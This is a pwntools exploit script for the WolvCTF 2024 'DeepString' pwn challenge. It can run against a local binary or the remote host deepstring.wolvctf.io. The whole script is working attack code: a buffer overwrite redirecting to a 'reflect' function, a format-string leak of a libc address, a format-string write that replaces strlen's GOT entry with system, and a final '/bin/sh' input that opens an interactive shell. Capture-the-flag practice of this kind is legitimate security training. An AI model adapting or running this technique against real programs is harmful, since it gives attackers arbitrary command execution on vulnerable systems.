#!/usr/bin/env python3
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/WolvCTF 2024/pwn/DeepString/DeepString')
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    # length
    r.sendlineafter(b'3) reverse\n', b'0')
    r.sendlineafter(b'Provide your almighty STRING: \n', b'A' * 224 + p64(elf.sym.reflect))

    # reflect
    r.sendlineafter(b'3) reverse\n', b'-10')
    r.sendlineafter(b'Provide your almighty STRING: \n', b'%59$p')

    main_ret = int(r.recvline().strip(), 16)
    libc.address = main_ret - libc.libc_start_main_return
    payload = fmtstr_payload(14, {elf.got['strlen']: p64(libc.sym.system)})

    # reflect
    r.sendlineafter(b'3) reverse\n', b'-10')
    r.sendlineafter(b'Provide your almighty STRING: \n', payload)

    # system
    r.sendlineafter(b'3) reverse\n', b'0')
    r.sendlineafter(b'Provide your almighty STRING: \n', b'/bin/sh')

    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('deepstring.wolvctf.io', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
